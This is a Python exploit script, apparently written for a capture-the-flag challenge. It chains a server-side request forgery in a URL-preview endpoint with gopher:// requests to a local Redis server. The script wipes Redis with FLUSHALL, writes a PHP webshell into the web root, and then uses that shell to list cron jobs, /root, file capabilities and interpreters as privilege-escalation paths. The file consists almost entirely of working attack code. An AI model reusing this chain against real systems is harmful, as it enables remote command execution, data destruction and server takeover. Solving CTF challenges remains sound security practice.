import urllib.request
import urllib.parse
import re
import sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch(target_url, timeout=10):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req, timeout=timeout)
        html = res.read().decode('utf-8', errors='replace')
        m = re.search(r'class="preview-content">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'PREVIEW: ' + m.group(1).strip()[:3000]
        m = re.search(r'class="error-msg">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'ERROR: ' + m.group(1).strip()
        return 'OTHER: len=' + str(len(html))
    except Exception as e:
        return f'EXCEPTION: {e}'

def redis_cmd(resp_cmds):
    encoded = urllib.parse.quote(resp_cmds)
    return fetch(f"gopher://127.0.0.1:6379/_{encoded}", timeout=10)

# Step 1: Re-establish webshell
php_payload = '\n\n<?php system($_GET["c"]); ?>\n\n'
resp = ""
resp += "*1\r\n$8\r\nFLUSHALL\r\n"
resp += "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$14\r\n/var/www/html/\r\n"
resp += "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n"
resp += f"*3\r\n$3\r\nSET\r\n$8\r\nwebshell\r\n${len(php_payload)}\r\n{php_payload}\r\n"
resp += "*1\r\n$4\r\nSAVE\r\n"
resp += "*1\r\n$4\r\nQUIT\r\n"
print("=== Re-establishing webshell ===")
print(redis_cmd(resp))
print()

# Step 2: Use webshell to enumerate privesc paths
cmds = [
    'id',
    'ls -la /etc/cron*',
    'ls -la /var/spool/cron',
    'which python3 python perl',
    'ls -la /usr/bin/find /usr/bin/cp',
    'cat /etc/crontab',
    'ls -la /root',
    'ls -laR /opt',
    'getcap -r / 2>/dev/null',
]

for cmd in cmds:
    print(f'=== {cmd} ===')
    result = fetch(f'http://127.0.0.1/shell.php?c={urllib.parse.quote(cmd)}')
    # Strip Redis binary header
    if 'PREVIEW:' in result:
        lines = result.split('\n')
        clean = [l for l in lines if 'REDIS0009' not in l and 'redis-ver' not in l and 'aof-preamble' not in l and l.strip()]
        print('\n'.join(clean))
    else:
        print(result)
    print()
